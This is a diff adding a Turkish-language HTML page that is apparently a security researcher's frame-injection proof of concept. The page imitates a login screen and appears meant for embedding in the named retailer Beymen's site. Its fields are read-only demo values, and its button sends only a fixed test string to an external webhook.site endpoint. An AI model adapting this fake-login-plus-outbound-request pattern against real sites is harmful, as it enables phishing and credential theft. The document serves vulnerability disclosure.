@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src https://webhook.site; base-uri 'none'; form-action 'none'; img-src data:">
+<title>Güvenlik Testi | Demo Giriş Portalı</title>
+<style>
+:root{font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;color:#16243a;background:#eef2f8}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;background:radial-gradient(ellipse at top left,#dfeaff 0%,transparent 55%),#eef2f8;display:grid;place-items:center;padding:30px 18px}
+.wrap{width:min(100%,490px)}
+.notice{background:#173366;color:#fff;border-radius:14px 14px 0 0;padding:11px 18px;display:flex;align-items:center;justify-content:space-between;gap:8px;font-size:11px;font-weight:750;letter-spacing:.08em;text-transform:uppercase}
+.notice .pill{border:1px solid #9fbae3;padding:4px 9px;border-radius:999px;color:#d2e3ff;white-space:nowrap}
+.card{background:#fff;border-radius:0 0 19px 19px;box-shadow:0 18px 70px #263e6530;border:1px solid #dce4f1;border-top:0;padding:34px}
+.logo{width:52px;height:52px;display:grid;place-items:center;background:linear-gradient(140deg,#315fbd,#153c78);color:#fff;font-size:26px;font-weight:800;border-radius:14px}
+h1{font-size:27px;letter-spacing:-.035em;line-height:1.2;margin:20px 0 9px}
+.subtitle{color:#687b91;line-height:1.5;font-size:14px;margin:0 0 26px}
+label{display:block;margin:0 0 7px;font-size:13px;font-weight:650;color:#26374e}
+.field{margin-bottom:17px}
+input{width:100%;border:1px solid #d6dfea;border-radius:9px;padding:14px 13px;outline:none;background:#f7f9fc;color:#4a5870;font-size:14px;cursor:not-allowed}
+button{width:100%;border:0;border-radius:9px;background:#244fa7;color:white;font-weight:730;font-size:15px;padding:15px;cursor:pointer;transition:background .15s}
+button:hover{background:#193d87}
+button:disabled{cursor:progress;opacity:.7}
+.explain{border:1px solid #d6e7ff;background:#f4f9ff;border-radius:10px;margin:22px 0 0;padding:13px 14px;font-size:12px;color:#425b7c;line-height:1.55}
+.explain strong{display:block;color:#17407f;font-size:12px;margin-bottom:4px}
+#status{font-size:12px;line-height:1.45;margin:14px 0 0;color:#455b76;min-height:20px}
+.footer{text-align:center;margin:17px 0 0;font-size:11px;color:#627388;line-height:1.6}
+@media(max-width:430px){.card{padding:24px}h1{font-size:24px}.notice{font-size:10px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+ <div class="notice"><span>Güvenlik Araştırması · Frame Injection</span><span class="pill">DEMO / POC</span></div>
+ <main class="card">
+  <div class="logo" aria-hidden="true">D</div>
+  <h1>Demo hesabınıza giriş</h1>
+  <p class="subtitle">Bu ekran, iframe içerisinde harici bir giriş arayüzünün nasıl göründüğünü göstermek amacıyla hazırlanmıştır.</p>
+  <form id="demo" novalidate>
+   <div class="field">
+    <label for="username">E-posta adresi</label>
+    <input id="username" type="email" value="demo@example.invalid" readonly tabindex="-1" autocomplete="off" aria-describedby="hint">
+   </div>
+   <div class="field">
+    <label for="password">Şifre</label>
+    <input id="password" type="password" value="DEMO_ONLY_NOT_A_PASSWORD" readonly tabindex="-1" autocomplete="off">
+   </div>
+   <button type="submit" id="submit">Demo girişi canlandır</button>
+  </form>
+  <section class="explain" id="hint"><strong>Bu gerçek bir giriş sayfası değildir.</strong>
+   Giriş alanları salt okunurdur. Gerçek kullanıcı bilgisi girilemez ve aktarılmaz.
+   Buton yalnızca <b>POC_DEMO_BUTTON_CLICKED</b> test olayını gönderir.</section>
+  <p id="status" role="status">Hazır. Test butonuna basarak sabit PoC olayını oluşturabilirsin.</p>
+ </main>
+ <p class="footer">Bağımsız güvenlik araştırması demonstrasyonu • Bu ekran Beymen'in resmî giriş sayfası değildir.<br>Çerez, kimlik bilgisi, kamera veya mikrofon erişimi yapılmaz.</p>
+</div>
+<script>
+"use strict";
+const form = document.getElementById("demo");
+const button = document.getElementById("submit");
+const status = document.getElementById("status");
+form.addEventListener("submit", async function(event) {
+ event.preventDefault();
+ button.disabled=true;
+ status.textContent="Sabit demo olayı gönderilmeye çalışılıyor…";
+ try {
+  await fetch("https://webhook.site/b8798469-3d3c-4107-8b00-281fe65716fe", {
+    method:"POST",
+    mode:"no-cors",
+    credentials:"omit",
+    referrerPolicy:"no-referrer",
+    headers:{"Content-Type":"text/plain"},
+    body:"POC_DEMO_BUTTON_CLICKED"
+  });
+  status.textContent="Gönderim denemesi tamamlandı. Olayın ulaştığını Webhook.site panelinden doğrulayın (tarayıcı alındı onayı okuyamaz).";
+ } catch(e) {
+  status.textContent="İstek tarayıcı, ağ veya güvenlik politikası tarafından engellendi. Test olayı ulaşmamış olabilir.";
+ } finally {
+  button.disabled=false;
+ }
+});
+</script>
+</body></html>
